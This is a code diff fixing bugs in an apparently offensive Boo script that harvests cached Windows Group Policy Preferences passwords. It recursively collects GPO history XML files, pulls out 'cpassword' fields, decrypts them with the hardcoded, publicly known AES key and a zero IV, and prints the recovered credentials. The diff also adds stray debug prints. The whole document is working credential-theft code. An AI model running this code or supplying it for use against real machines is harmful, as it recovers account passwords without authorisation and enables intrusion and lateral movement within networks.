@@ -35,18 +35,20 @@ public static def FindFiles(path as string, patterns as string) as List:
     // adapted from http://csharphelper.com/blog/2015/06/find-files-that-match-multiple-patterns-in-c/
     //      pattern: "*pass*;*.png;"
 
-    files as List
+    files = []
     try:
         // search every pattern in this directory's files
         for pattern as string in (@/;/.Split(patterns)):
             for f as string in Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly):
                 if f:
+                    //print "adding " + f + " to list" + files
                     files.Add(f)
+                    print files
 
         // go recurse in all sub-directories
         for directory in Directory.GetDirectories(path):
             if directory:
-                newfiles as List = FindFiles(directory, patterns)
+                newfiles= FindFiles(directory, patterns)
                 if newfiles:
                     files += newfiles
     except e as UnauthorizedAccessException:
@@ -54,7 +56,7 @@ public static def FindFiles(path as string, patterns as string) as List:
     except e as PathTooLongException:
         pass
 
-    return files
+    return files as List
 
 
 public static def DecryptGPP(cpassword as string) as string:
@@ -69,10 +71,10 @@ public static def DecryptGPP(cpassword as string) as string:
 
     base64decoded as (byte) = Convert.FromBase64String(cpassword)
 
-    aesObject as AesCryptoServiceProvider
+    aesObject = AesCryptoServiceProvider()
 
     aesKey = array(byte, (0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b))
-    aesIV as (byte)
+    aesIV = array(byte, (0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))
 
     aesObject.IV = aesIV
     aesObject.Key = aesKey
@@ -95,7 +97,7 @@ public static def GetCachedGPPPassword() as void:
             allUsers += "\\Application Data"
         allUsers += "\\Microsoft\\Group Policy\\History" // look only in the GPO cache folder
 
-        files as List = FindFiles(allUsers, "*.xml")
+        files = FindFiles(allUsers, "*.xml")
 
         // files will contain all XML files
         for file as string in files:
@@ -104,9 +106,9 @@ public static def GetCachedGPPPassword() as void:
                 or file.Contains("Printers.xml") or file.Contains("Drives.xml"))):
                 continue // uninteresting XML files, move to next
 
-            xmlDoc as XmlDocument
+            xmlDoc = XmlDocument()
             xmlDoc.Load(file)
-
+            
             if (not xmlDoc.InnerXml.Contains("cpassword")):
                 continue // no "cpassword" => no interesting content, move to next
 
@@ -208,7 +210,7 @@ public static def GetCachedGPPPassword() as void:
             print "cPassword: " + cPassword
             print "Changed: " + Changed
     except ex:
-        print String.Format("  [X] Exception: {0}", ex.Message)
+        print String.Format("  [X] Exception: {0}", ex)
 
 
 public static def Main():
